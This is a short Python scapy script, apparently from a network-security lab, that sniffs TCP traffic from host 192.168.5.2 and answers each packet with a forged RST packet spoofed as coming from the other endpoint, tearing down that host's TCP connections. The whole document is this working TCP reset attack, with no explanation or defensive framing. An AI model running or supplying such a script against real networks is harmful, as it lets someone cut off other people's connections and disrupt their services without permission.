#!/usr/bin/python3

import sys
from scapy.all import *

def spoof_tcp(pkt):
	IPLayer = IP(dst="192.168.5.2", src=pkt[IP].dst)
	TCPLayer = TCP(flags="R", seq=pkt[TCP].ack, dport=pkt[TCP].sport, sport=pkt[TCP].dport)

	spkt = IPLayer/TCPLayer
	send(spkt, verbose=0)

pkt=sniff(filter='tcp and src host 192.168.5.2', prn=spoof_tcp)
